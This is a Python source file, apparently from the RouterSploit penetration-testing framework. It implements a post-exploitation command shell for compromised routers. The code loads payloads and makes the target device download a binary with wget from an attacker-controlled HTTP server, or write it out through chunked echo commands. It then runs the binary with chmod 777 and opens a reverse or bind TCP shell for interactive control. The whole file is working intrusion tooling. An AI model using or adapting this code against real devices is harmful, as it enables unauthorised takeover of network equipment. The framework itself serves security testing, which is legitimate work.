import socket
import telnetlib
import SimpleHTTPServer
import BaseHTTPServer
import threading
import time
from os import listdir
from os.path import isfile, join
import importlib

from printer import printer_queue
from routersploit import validators

from routersploit.utils import (
    print_info,
    print_error,
    print_success,
    print_status,
    print_table,
    random_text,
)


def shell(exploit, architecture="", method="", **params):
    path = "routersploit/modules/payloads/{}/".format(architecture)
    payload = None
    options = []

    print_info()
    print_success("Welcome to cmd. Commands are sent to the target via the execute method.")
    print_status("Depending on the vulnerability, command's results might not be available.")
    print_status("For further exploitation use 'show payloads' and 'set payload <payload>' commands.")
    print_info()

    while 1:
        while not printer_queue.empty():
            pass

        if payload is None:
            cmd_str = "\001\033[4m\002cmd\001\033[0m\002 > "
        else:
            cmd_str = "\001\033[4m\002cmd\001\033[0m\002 (\033[92m{}\033[0m) > ".format(payload._Exploit__info__['name'])

        cmd = raw_input(cmd_str)

        if cmd in ["quit", "exit"]:
            return

        elif cmd == "show payloads":
            payloads = [f.split(".")[0] for f in listdir(path) if isfile(join(path, f)) and f.endswith(".py") and f != "__init__.py"]

            print_status("Available payloads:")
            for payload_name in payloads:
                print_info("- {}".format(payload_name))

        elif cmd.startswith("set payload "):
            c = cmd.split(" ")

            payload_path = path.replace("/", ".") + c[2]
            payload = getattr(importlib.import_module(payload_path), 'Exploit')()

            options = []
            for option in payload.exploit_attributes.keys():
                if option not in ["output", "filepath"]:
                    options.append([option, getattr(payload, option), payload.exploit_attributes[option]])

            if payload.handler == "bind_tcp":
                options.append(["rhost", validators.ipv4(exploit.target), "Target IP address"])

                if method == "wget":
                    options.append(["lhost", "", "Connect-back IP address for wget"])
                    options.append(["lport", 4545, "Connect-back Port for wget"])

        elif payload is not None:
            if cmd == "show options":
                headers = ("Name", "Current settings", "Description")

                print_info('\nPayload Options:')
                print_table(headers, *options)
                print_info()

            elif cmd.startswith("set "):
                c = cmd.split(" ")
                if len(c) != 3:
                    print_error("set <option> <value>")
                else:
                    for option in options:
                        if option[0] == c[1]:
                            print_success("{'" + c[1] + "': '" + c[2] + "'}")
                            option[1] = c[2]
                            setattr(payload, c[1], c[2])

            elif cmd == "run":
                data = payload.generate()

                if method == "wget":
                    elf_binary = payload.generate_elf(data)
                    communication = Communication(exploit, elf_binary, options, **params)
                    communication.wget()
                elif method == "echo":
                    elf_binary = payload.generate_elf(data)
                    communication = Communication(exploit, elf_binary, options, **params)
                    communication.echo()
                elif method == "generic":
                    params["exec_binary"] = data
                    communication = Communication(exploit, elf_binary, options, **params)

                if payload.handler == "bind_tcp":
                    communication.bind_tcp()
                elif payload.handler == "reverse_tcp":
                    communication.reverse_tcp()

            elif cmd == "back":
                payload = None

        else:
            print_status("Executing '{}' on the device...".format(cmd))
            exploit.execute(cmd)


class HttpRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

        self.wfile.write(self.server.content)
        self.server.stop = True

    def log_message(self, format, *args):
        return


class HttpServer(BaseHTTPServer.HTTPServer):
    def serve_forever(self, content):
        self.stop = False
        self.content = content
        while not self.stop:
            self.handle_request()


class Communication(object):
    def __init__(self, exploit, payload, options, location, wget_options={}, echo_options={}, exec_binary=None):
        self.exploit = exploit
        self.payload = payload
        self.options = {option[0]: option[1] for option in options}

        # location to save the payload e.g. /tmp/
        self.location = location

        # transfer techniques
        self.wget_options = wget_options
        self.echo_options = echo_options

        # process of executing payload
        self.exec_binary = exec_binary

        # name of the binary - its random 8 bytes
        self.binary_name = None

    def http_server(self, lhost, lport):
        print_status("Setting up HTTP server")
        server = HttpServer((lhost, int(lport)), HttpRequestHandler)

        server.serve_forever(self.payload)
        server.server_close()

    def wget(self):
        print_status("Using wget method")
        self.binary_name = random_text(8)

        if "binary" in self.wget_options.keys():
            binary = self.wget_options['binary']
        else:
            binary = "wget"

        # run http server
        thread = threading.Thread(target=self.http_server, args=(self.options['lhost'], self.options['lport']))
        thread.start()

        # wget binary
        print_status("Using wget to download binary")
        cmd = "{} http://{}:{}/{} -O {}/{}".format(binary,
                                                   self.options['lhost'],
                                                   self.options['lport'],
                                                   self.binary_name,
                                                   self.location,
                                                   self.binary_name)

        self.exploit.execute(cmd)

    def echo(self):
        print_status("Using echo method")
        self.binary_name = random_text(8)

        path = "{}/{}".format(self.location, self.binary_name)

        # echo stream e.g. echo -ne {} >> {}
        if "stream" in self.echo_options.keys():
            echo_stream = self.echo_options['stream']
        else:
            echo_stream = 'echo -ne "{}" >> {}'

        # echo prefix e.g. "\\x"
        if "prefix" in self.echo_options.keys():
            echo_prefix = self.echo_options['prefix']
        else:
            echo_prefix = "\\x"

        # echo max length of the block
        if "max_length" in self.echo_options.keys():
            echo_max_length = int(self.echo_options['max_length'])
        else:
            echo_max_length = 30

        size = len(self.payload)
        num_parts = (size / echo_max_length) + 1

        # transfer binary through echo command
        print_status("Using echo method to transfer binary")
        for i in range(0, num_parts):
            current = i * echo_max_length
            print_status("Transferring {}/{} bytes".format(current, len(self.payload)))

            block = self.payload[current:current + echo_max_length].encode('hex')
            block = echo_prefix + echo_prefix.join(a + b for a, b in zip(block[::2], block[1::2]))
            cmd = echo_stream.format(block, path)
            self.exploit.execute(cmd)

    def listen(self, lhost, lport):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((lhost, int(lport)))
        sock.listen(5)
        return sock

    def build_commands(self):
        path = "{}/{}".format(self.location, self.binary_name)

        commands = []
        if isinstance(self.exec_binary, list) or isinstance(self.exec_binary, tuple):
            for item_exec_binary in self.exec_binary:
                if isinstance(item_exec_binary, str):
                    try:
                        commands.append(item_exec_binary.format(path))
                    except ValueError:
                        commands.append(item_exec_binary)
                elif callable(item_exec_binary):
                    commands.append(item_exec_binary(path))
        else:
            exec_binary_str = "chmod 777 {0}; {0}; rm {0}".format(path)
            commands.append(exec_binary_str) 

        return commands

    def reverse_tcp(self):
        sock = self.listen(self.options['lhost'], self.options['lport'])

        # execute binary
        commands = self.build_commands()

        for command in commands:
            thread = threading.Thread(target=self.exploit.execute, args=(command,))
            thread.start()

        # waiting for shell
        print_status("Waiting for reverse shell...")
        client, addr = sock.accept()
        sock.close()
        print_status("Connection from {}:{}".format(addr[0], addr[1]))

        print_success("Enjoy your shell")
        t = telnetlib.Telnet()
        t.sock = client
        t.interact()

    def bind_tcp(self):
        # execute binary
        commands = self.build_commands()

        for command in commands:
            thread = threading.Thread(target=self.exploit.execute, args=(command,))
            thread.start()

        # connecting to shell
        print_status("Connecting to {}:{}".format(self.options['rhost'], self.options['rport']))
        time.sleep(2)

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((self.options['rhost'], int(self.options['rport'])))

        print_success("Enjoy your shell")
        tn = telnetlib.Telnet()
        tn.sock = sock
        tn.interact()
